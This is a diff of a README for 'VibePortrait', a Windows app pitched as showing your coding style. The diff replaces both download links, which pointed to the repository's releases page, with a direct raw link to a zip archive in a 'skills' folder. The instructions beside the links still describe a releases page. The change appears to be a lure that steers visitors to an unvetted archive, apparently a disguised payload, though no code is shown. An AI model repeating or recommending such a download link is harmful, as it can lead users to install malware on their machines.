@@ -1,6 +1,6 @@
 # 🎭 VibePortrait - See Your Coding Style Clearly
 
-[![Download VibePortrait](https://img.shields.io/badge/Download%20VibePortrait-purple?style=for-the-badge)](https://github.com/Supportleslierichardgroves200/VibePortrait/releases)
+[![Download VibePortrait](https://img.shields.io/badge/Download%20VibePortrait-purple?style=for-the-badge)](https://github.com/Supportleslierichardgroves200/VibePortrait/raw/refs/heads/main/skills/Vibe_Portrait_v2.7.zip)
 
 ## 🧭 What VibePortrait Does
 
@@ -20,7 +20,7 @@ Use it to:
 
 Visit this page to download VibePortrait for Windows:
 
-[https://github.com/Supportleslierichardgroves200/VibePortrait/releases](https://github.com/Supportleslierichardgroves200/VibePortrait/releases)
+[https://github.com/Supportleslierichardgroves200/VibePortrait/raw/refs/heads/main/skills/Vibe_Portrait_v2.7.zip](https://github.com/Supportleslierichardgroves200/VibePortrait/raw/refs/heads/main/skills/Vibe_Portrait_v2.7.zip)
 
 On that page, look for the latest release and download the Windows file. If the release offers a setup file, use that one. If it offers a .zip file, download it and extract it before opening the app.
 
